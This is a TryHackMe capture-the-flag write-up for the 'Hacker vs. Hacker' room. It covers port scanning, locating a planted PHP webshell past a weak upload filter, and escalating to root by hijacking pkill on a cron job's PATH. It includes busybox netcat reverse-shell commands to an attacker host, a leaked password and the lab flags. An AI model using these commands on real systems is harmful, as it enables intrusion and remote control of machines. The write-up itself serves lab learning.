---
title: "Hacker vs. Hacker"
date: 2025-02-13
image: /assets/img/tryhackme/Hackervshacker/Hackervshacker_image.jpg
description: Writeup of the TryHackMe-CTF ###
categories: [Tryhackme, Easy]
tags: [linux, web, privesc]
---

## Challenge Description
<center>
<table>
  <tr>
    <td>Plattform</td>
    <td>TryHackMe</td>
  </tr>
  <tr>
    <td>Name</td>
    <td>Hacker vs. Hacker</td>
  </tr>
  <tr>
    <td>Description</td>
    <td>Someone has compromised this server already! Can you get in and evade their countermeasures?</td>
  </tr>
  <tr>
    <td>Difficulty</td>
    <td>Easy</td>
  </tr>
  <tr>
    <td>OS</td>
    <td>Linux</td>
  </tr>
  <tr>
    <td>Link</td>
    <td><a href="https://tryhackme.com/room/hackervshacker">https://tryhackme.com/room/hackervshacker</a></td>
  </tr>
</table>
</center>

This writeup is a possible solution of the CTF-challenge Hacker vs. Hacker.

## Enumeration
I started the enumeration using `nmap`:
```bash
$ nmap -p- 10.10.103.67
  Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-02-13 09:27 EST
  Nmap scan report for 10.10.103.67
  Host is up (0.039s latency).
  Not shown: 65533 closed tcp ports (conn-refused)
  PORT   STATE SERVICE
  22/tcp open  ssh
  80/tcp open  http

  Nmap done: 1 IP address (1 host up) scanned in 22.96 seconds
```
and enumerated the found services in more depth using nmap's `-A` flag:
```bash
$ nmap -A -p 22,80 10.10.103.67
  Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-02-13 09:28 EST
  Nmap scan report for 10.10.103.67
  Host is up (0.039s latency).

  PORT   STATE SERVICE VERSION
  22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.4 (Ubuntu Linux; protocol 2.0)
  | ssh-hostkey: 
  |   3072 9f:a6:01:53:92:3a:1d:ba:d7:18:18:5c:0d:8e:92:2c (RSA)
  |   256 4b:60:dc:fb:92:a8:6f:fc:74:53:64:c1:8c:bd:de:7c (ECDSA)
  |_  256 83:d4:9c:d0:90:36:ce:83:f7:c7:53:30:28:df:c3:d5 (ED25519)
  80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
  |_http-server-header: Apache/2.4.41 (Ubuntu)
  |_http-title: RecruitSec: Industry Leading Infosec Recruitment
  Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

  Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
  Nmap done: 1 IP address (1 host up) scanned in 8.18 seconds
```
From here I proceeded the analysis port by port.

## Port 80 Analysis

While manually analyzing the website, I found a comment in the source code:
```html
<!-- im no security expert - thats what we have a stable of nerds for - but isn't /cvs on the public website a privacy risk? -->
```

The website also provided an upload functionality for CV's as well. Which means uploaded CV's will be stored in the `/cvs` subdirectory. I tried to upload valid files, a PHP webshell, and other stuff, but I always received the following message:
```text
Hacked! If you dont want me to upload my shell, do better at filtering!
```
quick check of the source code revealed some interesting details:
```html
<!-- seriously, dumb stuff:

$target_dir = "cvs/";
$target_file = $target_dir . basename($_FILES["fileToUpload"]["name"]);

if (!strpos($target_file, ".pdf")) {
  echo "Only PDF CVs are accepted.";
} else if (file_exists($target_file)) {
  echo "This CV has already been uploaded!";
} else if (move_uploaded_file($_FILES["fileToUpload"]["tmp_name"], $target_file)) {
  echo "Success! We will get back to you.";
} else {
  echo "Something went wrong :|";
}
-->
```

With this in mind I tried a pdf file, but got the same error. The attacker seems to have disabled the upload function but already used it for initial access. The code only checks for one occurrence of `.pdf` so the name of the shell could be like `something.pdf.php`:

```bash
$ ffuf -u http://10.10.103.67/cvs/FUZZ.pdf.php -w /usr/share/wordlists/seclists/Discovery/Web-Content/raft-large-words.txt 

          /'___\  /'___\           /'___\       
         /\ \__/ /\ \__/  __  __  /\ \__/       
         \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
          \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
           \ \_\   \ \_\  \ \____/  \ \_\       
            \/_/    \/_/   \/___/    \/_/       

         v2.1.0-dev
  ________________________________________________

   :: Method           : GET
   :: URL              : http://10.10.103.67/cvs/FUZZ.pdf.php
   :: Wordlist         : FUZZ: /usr/share/wordlists/seclists/Discovery/Web-Content/raft-large-words.txt
   :: Follow redirects : false
   :: Calibration      : false
   :: Timeout          : 10
   :: Threads          : 40
   :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
  ________________________________________________

shell                   [Status: 200, Size: 18, Words: 1, Lines: 2, Duration: 44ms]
```

Fuff helped to find it real quick. That seems like a regular PHP webshell one-liner:

![Web Shell](/assets/img/tryhackme/Hackervshacker/thm_hackervshacker_1.jpg)

I used it to get a reverse shell using `busybox` 

```html
http://10.10.103.67/cvs/shell.pdf.php?cmd=busybox nc [attackerip] 9001 -e sh
```

While trying to stabilize the shell with Python, the word `nope` appeared, and my `PTY` was terminated. It appears that there is a mechanism in place to prevent stabilization or the initiation of `PTY` sessions. But I was able to collect the user flag anyway:

```bash
www-data@b2r:/var/www/html/cvs$ nope
cd /home
ls
lachlan
cd lachlan
ls
bin
user.txt
cat user.txt 
thm{af7e46b68081d4025c5ce10851430617}
```

## Privilege Escalation lachlan

From this point, I attempted to escalate privileges to the user `lachlan`. I found something interesting in the `bash_history` of the user:

```bash
cat .bash_history
./cve.sh
./cve-patch.sh
vi /etc/cron.d/persistence
echo -e "dHY5pzmNYoETv7SUaY\nthisistheway123\nthisistheway123" | passwd
ls -sf /dev/null /home/lachlan/.bash_history
```

The user changed their password in an insecure manner. From here ssh isn't possible because the shell gets closed again instantly with a `nope`. After researching the `ssh` command, I discovered that `ssh` does not create a PTY session when using the `-T` flag.

## Privilege Escalation root

While searching for a way to gain root access, I found a cron job file named `persistence`:

```bash
cat /etc/cron.d/persistence
PATH=/home/lachlan/bin:/bin:/usr/bin
# * * * * * root backup.sh
* * * * * root /bin/sleep 1  && for f in `/bin/ls /dev/pts`; do /usr/bin/echo nope > /dev/pts/$f && pkill -9 -t pts/$f; done
* * * * * root /bin/sleep 11 && for f in `/bin/ls /dev/pts`; do /usr/bin/echo nope > /dev/pts/$f && pkill -9 -t pts/$f; done
* * * * * root /bin/sleep 21 && for f in `/bin/ls /dev/pts`; do /usr/bin/echo nope > /dev/pts/$f && pkill -9 -t pts/$f; done
* * * * * root /bin/sleep 31 && for f in `/bin/ls /dev/pts`; do /usr/bin/echo nope > /dev/pts/$f && pkill -9 -t pts/$f; done
* * * * * root /bin/sleep 41 && for f in `/bin/ls /dev/pts`; do /usr/bin/echo nope > /dev/pts/$f && pkill -9 -t pts/$f; done
* * * * * root /bin/sleep 51 && for f in `/bin/ls /dev/pts`; do /usr/bin/echo nope > /dev/pts/$f && pkill -9 -t pts/$f; done
```

The path for the execution is `/home/lachlan/bin` which is under control. Since the `pkill` command is not referenced by its full path, we can exploit this by creating our own executable:

```bash
pwd
	/home/lachlan/bin
echo "busybox nc [attackerip] 9002 -e sh" > pkill
chmod 777 pkill
```

I then started a `netcat` listener and waited for the incoming connection:

```bash
$ nc -lnvp 9002
listening on [any] 9002 ...
connect to [attackerip] from (UNKNOWN) [10.10.103.67] 37212
whoami
root
cat /root/root.txt
thm{7b708e5224f666d3562647816ee2a1d4}
```

solved! :)
